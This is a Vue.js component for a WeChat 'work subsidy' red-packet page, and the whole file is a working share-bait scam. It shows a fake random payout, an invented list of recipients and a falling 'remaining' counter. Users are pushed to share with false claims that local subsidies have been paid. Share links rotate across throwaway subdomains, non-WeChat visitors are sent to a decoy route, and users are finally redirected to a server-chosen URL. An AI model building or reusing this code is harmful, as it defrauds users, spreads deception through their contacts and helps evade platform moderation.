<template>
  <div class="page-parent">
    <div class="shadow" @click="tipShare" @touchmove.prevent v-if="shadow"></div>
    <div class="bg-red" @touchmove.prevent></div>
    <div class="receive-top">
      <div class="return-button"><p>返回</p></div>
      <div class="share-button">
        <img class="share-img" src="@/assets/share.png" style="width: 100%;">
        <p class="share-text">点击分享</p>
      </div>
      <div class="top-div-img">
        <img src="@/assets/head.jpg" class="receive-logo"/>
      </div>
      <div class="top-div-font">
        <p class="receive-title">{{ receiveTitle }}</p>
        <p class="receive-amount">￥{{ receiveAmount.toFixed(2) }}</p>
        <p class="receive-content">{{ receiveContent }}</p>
      </div>
      <div class="top-div-button">
        <p class="receive-button-parent" v-show="showOk">
          <a-button type="primary" class="receive-button" shape="round" @click="openReceive">
            <div class="receive-font">确定</div>
          </a-button>
        </p>
      </div>
    </div>
    <div class="black-10px"></div>
    <div class="receive-bottom">
      <p class="receive-count">
        <span>总计&nbsp;{{ count }}&nbsp;份</span>
        &nbsp;&nbsp;
        <span>剩余&nbsp;{{ remaining }}&nbsp;份</span>
      </p>
      <div class="black-1px"></div>
      <vue-seamless-scroll :data="dataList" :class-option="optionSingleHeight" class="seamless-warp">
        <a-row v-for="item in dataList" class="user-list">
          <a-col :span="4">
            <p class="user-list-inner-p user-list-header">
              <a-avatar slot="avatar" :src="item.src" shape="square" size="large"/>
            </p>
          </a-col>
          <a-col :span="16">
            <p class="user-list-inner-p user-list-name" v-text="item.name"></p>
            <p class="user-list-inner-p user-list-date" v-text="item.date"></p>
          </a-col>
          <a-col :span="4">
            <p class="user-list-inner-p user-list-status">
              <a-avatar slot="avatar" :src="item.status" shape="square" size="large"/>
            </p>
          </a-col>
          <div class="black-1px"></div>
        </a-row>
      </vue-seamless-scroll>
    </div>
    <modal1 :showModal="showModal1" @close="closeModal1" :receiveAmount="receiveAmount"></modal1>
    <modal2 :showModal="showModal2" @close="closeModal2"></modal2>
    <modal3 :showModal="showModal3" @close="closeModal3" :receiveAmount="receiveAmount"></modal3>
    <modal4 :showModal="showModal4" @close="closeModal4" :receiveAmount="receiveAmount"
            :shareCount="shareCount"></modal4>
    <modal5 :showModal="showModal5" @close="closeModal5" :receiveAmount="receiveAmount"></modal5>
    <modal6 :showModal="showModal6" @close="closeModal6" :otherUrl="otherUrl"></modal6>
  </div>

</template>

<script>
import vueSeamlessScroll from 'vue-seamless-scroll'
import moment from "moment";
import modal1 from "@/components/modal1";
import modal2 from "@/components/modal2";
import modal3 from "@/components/modal3";
import modal4 from "@/components/modal4";
import modal5 from "@/components/modal5";
import modal6 from "@/components/modal6";

export default {
  name: 'receive',
  components: {
    vueSeamlessScroll,
    modal1,
    modal2,
    modal3,
    modal4,
    modal5,
    modal6,
  },
  computed: {
    optionSingleHeight() {
      return {
        singleHeight: 60,
        waitTime: 1000,
        direction: 0,
        step: 2
      }
    }
  },
  data: () => {
    return {
      receiveTitle: "开工补助",
      receiveAmount: 0,
      finalAmount: 0,
      receiveContent: "完成所有步骤后，自动存入零钱",
      count: "1000000",
      remaining: "1000000",
      dataList: [],
      urlSettings: {},
      locationInfo: {},
      imgUrl: 'https://p.ssl.qhimg.com/t01ff8232463fbb9782.png',
      shareCount: 2,
      isDebug: false,
      shadow: true,
      showOk: true,
      showModal1: true,
      showModal2: false,
      showModal3: false,
      showModal4: false,
      showModal5: false,
      showModal6: false,
      location: '',
      jsUrls: [
        'http://42bhg10.z2m1n7.cn/',
        'http://fbn854kij.z2m1n7.cn/',
        'http://km584tg.z2m1n7.cn/',
        'http://kh87hyg.z2m1n7.cn/',
        'http://hghjguhuiu.z2m1n7.cn/',
      ],
      shareUrl: 'http://42bhg10.z2m1n7.cn',
      otherUrl: 'https://mmbizurl.cn/s/EAtPNxijf',
    }
  },
  mounted() {
    this.initAmountV2();
    if (!this.isWx()) {
      console.log('清空')
      this.$router.push({path: "/demo"})
    }
    let fromHome = window.sessionStorage.getItem('fromHome')
    let firstUrl = window.sessionStorage.getItem('firstUrl')
    console.log('page2-->fromHome', fromHome)
    console.log('page2-->firstUrl', firstUrl)
    if (!this.isDebug) {
      // if (this.checkHome()) {
      if (true) {
        this.getLocation()
        // this.autoShadow()
        this.initUserList()
        this.initShareUrl()
        this.changeCount()
        this.initApiInfo()
        this.getUrl()
      } else {
        this.$router.push('/')
      }

    }

  },
  methods: {
    isWx() {
      let ua = window.navigator.userAgent.toLowerCase();
      if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        return true;
      } else {
        return false;
      }
    },
    initShareUrl() {
      this.shareUrl = this.checkUrl()
    },
    checkUrl() {
      let firstUrl;
      if (window.sessionStorage.getItem('toIndex')) {
        // 从首页进入  获取首页url
        firstUrl = window.sessionStorage.getItem('firstUrl')
      } else {
        // 从分享进入 获取分享url
        firstUrl = window.location.href
      }
      // this.$message.success(firstUrl)
      firstUrl.startsWith(this.jsUrls[0])
      if (firstUrl.startsWith(this.jsUrls[0])) {
        return this.jsUrls[1]
      } else if (firstUrl.startsWith(this.jsUrls[1])) {
        return this.jsUrls[2]
      } else if (firstUrl.startsWith(this.jsUrls[2])) {
        return this.jsUrls[3]
      } else if (firstUrl.startsWith(this.jsUrls[3])) {
        return this.jsUrls[4]
      } else if (firstUrl.startsWith(this.jsUrls[4])) {
        return this.jsUrls[0]
      }
    },
    closeModal1() {
      this.showModal1 = false
    },
    closeModal2() {
      this.showModal2 = false
    },
    closeModal3() {
      this.showModal3 = false
    },
    closeModal4() {
      this.showModal4 = false
    },
    closeModal5() {
      this.showModal5 = false
    },
    closeModal6() {
      this.showModal6 = false
    },
    checkHome() {
      let fromHome = window.sessionStorage.getItem('fromHome')
      // this.$message.success("fromHome:" + fromHome)
      return fromHome
    },
    autoShadow() {
      const _this = this
      setTimeout(() => {
        _this.shadow = false
        _this.showOk = true
      }, 1000)
    },
    createRandomNumber(min, max) {
      let receiveAmount = (Math.random() * 10 + 160).toFixed(2) - 0
      if (receiveAmount > max || receiveAmount < min) {
        receiveAmount = this.createRandomNumber(min, max)
      }
      return receiveAmount;
    },
    initAmount(min, max) {
      let receiveAmount = this.createRandomNumber(min, max)
      this.finalAmount = receiveAmount
      let add = setInterval(() => {
        this.receiveAmount += 2.76
        if (this.receiveAmount >= this.finalAmount) {
          this.receiveAmount = this.finalAmount
          clearInterval(add)
        }
      }, 5)
      return receiveAmount;
    },
    initAmountV2() {
      let receiveAmount = Math.random() * 10 + 160
      this.finalAmount = receiveAmount
      let add = setInterval(() => {
        this.receiveAmount += 2.76
        if (this.receiveAmount >= this.finalAmount) {
          this.receiveAmount = this.finalAmount
          clearInterval(add)
        }
      }, 5)
      return receiveAmount;
    },
    initUserList() {
      let dataList = [
        {
          src: require('@/assets/wx-header/1.jpg'),
          name: '华何不离伤',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/2.jpg'),
          name: '笑看浮华苍生.',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/3.jpg'),
          name: '回忆的沙漏',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/4.jpg'),
          name: '青丝茧',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/5.jpg'),
          name: '自心难控',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/6.jpg'),
          name: '寶貝猪唲〃',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/7.jpg'),
          name: '雨晨的清风',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/8.jpg'),
          name: '白云要吃糖',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/9.jpg'),
          name: '化思念为星',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/10.gif'),
          name: '如花的旋律',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/11.jpg'),
          name: '舞尽锦瑟年华。',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/12.jpg'),
          name: '橘子味的猫',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/13.jpg'),
          name: '粉色の甜心',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/14.jpg'),
          name: '懒得取名',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/15.jpg'),
          name: '偷来の潶目艮圈',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/16.jpg'),
          name: '趁年轻、赶紧疯',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/17.jpg'),
          name: '借我回眸一眼',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
        {
          src: require('@/assets/wx-header/18.jpg'),
          name: '短腿猫不吃鱼',
          date: '16:40',
          status: require('@/assets/status.png'),
        },
      ]
      let now = new moment()
      for (let i = 0; i < dataList.length; i++) {
        dataList[i].date = now.subtract(Math.random() * 10, 'm').format('HH:mm');
      }
      this.dataList = dataList
    },
    changeCount() {
      setInterval(() => {
        this.remaining--
      }, 1000)
    },
    openReceive() {
      window.location.href = this.urlSettings.url
    },
    tipShare() {
      this.showModal2 = true
    },
    getUrl() {
      this.$http.get('/api/wx/getUrlByKeyWords?keyWords=receive').then(result => {
        if (result.status !== 200) {
          this.$message.error(result.message);
          return;
        }
        if (result.data !== null) {
          this.urlSettings = result.data;
        }
      }).catch(function (error) {
        console.error('出现错误:', error);
      });
    },
    getLocation() {
      this.$http.get('/api/wx/getLocationV2').then(result => {
        console.log('location:', result)
        if (result.status !== 200) {
          this.$message.error(result.message);
          return;
        }
        console.log(result)
        this.location = result.data.cityName
        this.getWxConfig()
      }).catch(function (error) {
        console.error('出现错误:', error);
      });
    },
    getWxConfig() {
      // const url = window.location.href.split('#')[0]
      const url = window.sessionStorage.getItem('firstUrl')
      this.$http.get(`/api/wx/getWxConfig?url=${url}`).then(result => {
        console.log('wxConfig', result)
        if (result.status !== 200) {
          return
        }
        this.wxConfig = result.data
        this.$wx.config({
          debug: this.isDebug, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。
          appId: this.wxConfig.appId,
          timestamp: this.wxConfig.timestamp, // 必填，生成签名的时间戳
          nonceStr: this.wxConfig.nonceStr, // 必填，生成签名的随机串
          signature: this.wxConfig.signature,// 必填，签名
          jsApiList: [
            'onMenuShareAppMessage',//获取“分享给朋友”按钮点击状态及自定义分享内容接口（即将废弃）
            'updateAppMessageShareData',//自定义“分享给朋友”及“分享到QQ”按钮的分享内容
            'updateTimelineShareData', //自定义“分享到朋友圈”及“分享到QQ空间”按钮的分享内
          ],
        });
      }).catch(exception => {
        // layer.msg('系统错误');
        console.error('系统错误', exception)
      })
    },
    initApiInfo() {
      const _this = this;
      _this.$wx.ready(function () {
        // _this.$message.success('ready方法调用')
        _this.initShareMenuEvent()
        // _this.initAppShareInfo()
        _this.initTimeShareInfo()
        // _this.initLocationApi()
      });
    },
    initAppShareInfo() {
      const _this = this;
      _this.$wx.updateAppMessageShareData({
        title: `${this.location}各区县.补贴.款.到了.我已领取￥${this.receiveAmount}`, // 分享标题
        desc: '分享即可领取现金红包', // 分享描述
        link: this.shareUrl, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致
        imgUrl: _this.imgUrl, // 分享图标
        success: function () {
          console.log('好友分享信息设置成功')
          // _this.$message.success('好友分享信息设置成功')
        }
      })
    },
    initTimeShareInfo() {
      const _this = this;
      _this.$wx.updateTimelineShareData({
        title: `${this.location}各区县.补贴.款.到了.我已领取￥${this.finalAmount.toFixed(2)}`,
        link: this.shareUrl,
        imgUrl: _this.imgUrl, // 分享图标
        success: function () {
          console.log('朋友圈分享信息设置成功')
          // _this.$message.success('朋友圈分享信息设置成功')
        }
      })
    },
    initShareMenuEvent() {
      const _this = this;
      _this.$wx.onMenuShareAppMessage({
        title: `${this.location}各区县.补贴.款.到了.我已领取￥${this.finalAmount.toFixed(2)}`, // 分享标题
        desc: '分享即可领取现金红包', // 分享描述
        link: this.shareUrl, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致
        imgUrl: _this.imgUrl, // 分享图标
        type: '', // 分享类型,music、video或link，不填默认为link
        dataUrl: '', // 如果type是music或video，则要提供数据链接，默认为空
        success: function () {
          _this.shareCount = _this.shareCount - 1
          console.log('触发分享事件:', _this.shareCount)
          if (_this.shareCount === 2) {
            _this.showModal3 = true
          }
          if (_this.shareCount === 1) {
            _this.showModal4 = true
          }
          if (_this.shareCount <= 0) {
            _this.shadow = false
            _this.showOk = true
            _this.showModal6 = true
          }
        }
      });
    },
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped lang="less">
* {
  font-family: '宋体';
  font-weight: 500;
}

p {
  margin: 0;
  padding: 0;
}

.seamless-warp {
  height: 500px;
  overflow: hidden;
  //margin: 10px;
}

.page-parent {
  width: 100%;
  height: 100vh;
  background-color: #fff;
}

.shadow {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  z-index: 100;
  background-color: rgba(254, 123, 159, 0.1);
  opacity: 0.1;
  //display: none;
}

.bg-red {
  position: absolute;
  top: 5.7vh;
  left: -25%;
  width: 150%;
  height: 35vh;
  background-color: #E1604C;
  //background-color: #000;
  border-radius: 50%;
  //opacity: 0.3;
  //z-index: 2;
  //display: none;
}

.receive-top {
  width: 100%;
  margin: 0 auto;
  justify-content: space-between;
  text-align: center;
  height: 40%;
  border-radius: 0 0 35% 35%;
  background-color: #E1604C;
  z-index: 3;
}

.return-button {
  display: none;
  width: 10%;
  position: absolute;
  top: 2vh;
  background-color: #fff;
  height: 5vh;
  line-height: 5vh;
  opacity: 0.7;
  border-radius: 0 45% 45% 0;
}

.share-button {
  width: 20%;
  position: absolute;
  top: 2vh;
  right: 2vh;
  height: 5vh;
  line-height: 5vh;
  opacity: 0.7;
  animation: share-button 2s ease-in infinite;
}

@keyframes share-button {
  50% {
    transform: scale(1, 1) translate(0, -15px)
  }
}

.top-div-img {
  height: 30%;
  width: 100%;
  text-align: center;
  //border: 1px solid red;
  //border-radius: 25px;
}

.top-div-font {
  height: 40%;
  width: 100%;
  text-align: center;
  position: relative;
  padding: 5px;
  //border: 1px solid red;
  //border-radius: 25px;
}

.share-text {
  position: relative;
  top: 3%;
  opacity: 0.7;
  color: #fff;
}

.receive-logo {
  width: 15%;
  position: relative;
  top: 15%;
  margin: 0 auto;
}

.receive-title {
  width: 100%;
  font-size: 16px;
  color: #ebcd9b;
}

.receive-amount {
  //position: relative;
  //top: -15%;
  width: 100%;
  font-weight: 600;
  font-size: 38px;
  color: #ebcd9b;
}

.receive-content {
  //position: relative;
  //top: -20%;
  width: 100%;
  font-size: 14px;
  color: #ebcd9b;
}

.top-div-button {
  height: 30%;
  width: 100%;
  text-align: center;
  //border: 1px solid red;
  //border-radius: 25px;
  padding: 20px;

}

.receive-button-parent {
  width: 100%;
  height: 8vh;
  //z-index: 10000;
  margin: 0 auto;
  border: none;
}

.receive-button {
  width: 25%;
  height: 100%;
  background-color: #ebcd9b;
  //z-index: 10000;
  margin: 0 auto;
  border: none;
  color: rgb(234, 65, 41);
  font-size: 20px;
}

.receive-font {
  color: rgb(234, 65, 41);
  font-size: 20px;
  line-height: 5vh;
  font-weight: 600;
}

.receive-bottom {
  width: 100%;
  height: 100vh;
  background-color: rgba(255, 255, 255, 0.5);
}


.black-10px {
  width: 100%;
  height: 10px;
  background-color: #f1f1f1;
  z-index: 10;
  margin-top: 5px;
}

.black-1px {
  width: 100%;
  height: 1px;
  background-color: #f1f1f1;
}

.user-list {
  height: 50px;
  line-height: 50px;
  text-align: left;
  margin-top: 10px;
}

.user-list-inner-p {
  text-align: center;
  margin: 0;
  padding: 0;
}

.user-list-name {
  text-align: left;
  line-height: 25px;
}

.user-list-date {
  text-align: left;
  line-height: 25px;
  color: #929493;
}

.user-list-status {
  text-align: center;
}

.receive-count {
  color: #a3a0a0;
  padding: 5px 5px 5px 20px;
  margin: 0;
}
</style>
